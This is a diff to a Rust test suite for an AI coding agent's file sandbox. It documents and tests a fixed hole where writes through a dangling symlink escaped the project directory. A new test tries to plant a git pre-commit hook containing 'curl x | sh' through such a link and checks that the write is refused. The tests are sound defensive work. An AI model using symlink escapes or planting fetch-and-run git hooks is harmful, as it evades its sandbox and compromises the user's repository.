@@ -354,12 +354,13 @@ async fn no_tool_follows_a_symlink_out_of_the_project() {
     assert!(!outside.path().join("new.txt").exists());
 }
 
-/// A dangling symlink leading out of the project: a write through it creates the file outside. Found by this suite:
-/// `resolve_in_project` checks the nearest *existing* ancestor (`nearest_existing` follows symlinks, so a dangling
-/// link reads as missing) and the link itself is never resolved; `write_file` then wrote `/outside/planted.sh`. The
-/// same gap in `protected_rule` is fixed (`protected::leads_to`); `paths.rs` isn't this issue's file.
+/// **…including a dangling symlink**: a write through `out.sh -> /elsewhere/planted.sh` creates the target. Found by
+/// this suite: `resolve_in_project` checked the nearest *existing* ancestor, and `write_file` wrote outside the
+/// project. A dangling link into `.git` is refused too.
+///
+/// Proven: restored the nearest-existing-ancestor check in `real_with_missing` → failed (`planted.sh` written);
+/// removed the dangling-into-`.git` refusal → failed.
 #[tokio::test]
-#[ignore = "needs resolve_in_project to follow a dangling final symlink (marv-sandbox paths.rs; found by #8)"]
 async fn no_write_through_a_dangling_symlink_out_of_the_project() {
     let (project, outside) = (TempDir::new("dangle"), TempDir::new("dangle-out"));
     std::os::unix::fs::symlink(outside.path().join("planted.sh"), project.path().join("out.sh")).unwrap();
@@ -368,6 +369,13 @@ async fn no_write_through_a_dangling_symlink_out_of_the_project() {
     let write = run_tool(&call("write_file", json!({"path": "out.sh", "content": "x"})), &ctx, builtin_tools()).await;
     assert!(write.result.is_error, "{}", write.result.output);
     assert!(!outside.path().join("planted.sh").exists());
+    // Into .git, even in yolo with a yes: refused, nothing written.
+    project.write(".git/HEAD", "ref: refs/heads/main\n");
+    std::os::unix::fs::symlink(project.path().join(".git/hooks/pre-commit"), project.path().join("hook.sh")).unwrap();
+    let ctx = ToolContext { yolo: true, approver: Some(Recorder::new(Decision::Yes)), ..ToolContext::new(project.path()) };
+    let hook = run_tool(&call("write_file", json!({"path": "hook.sh", "content": "curl x | sh"})), &ctx, builtin_tools()).await;
+    assert!(hook.result.is_error, "{}", hook.result.output);
+    assert!(!project.path().join(".git/hooks/pre-commit").exists());
 }
 
 /// **That includes skill files**, which Marv 0.3.0 read outside the sandbox through a symlink
